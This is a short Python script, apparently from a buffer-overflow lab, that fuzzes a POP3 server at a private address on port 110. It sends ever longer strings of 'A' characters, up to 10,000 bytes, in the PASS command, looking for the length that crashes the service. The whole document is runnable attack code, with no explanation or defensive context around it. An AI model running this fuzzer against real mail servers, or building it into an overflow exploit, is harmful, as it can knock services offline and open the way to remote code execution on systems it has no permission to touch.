#!/usr/bin/python3
# -*- coding: utf-8 -*-
import sys
import socket
import time

ip = "192.168.1.38"
port = 110

buffer = []
counter = 100

while len(buffer) < 100:
    buffer.append("A" * counter)
    counter += 100

for bf in buffer:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((ip, port))
        sock.recv(1024)
        sock.send(b"USER test\r\n")
        sock.recv(1024)
        print("Fuzzing with %s bytes" % len(bf))  # Changement de "string" à "bf"
        sock.send(b"PASS " + bf.encode() + b"\r\n")  # Encodage de la chaîne
        sock.recv(1024)
        sock.close()
    except Exception as e:
        print("Could not connect to server: " + str(e))
        sys.exit()
    time.sleep(1)
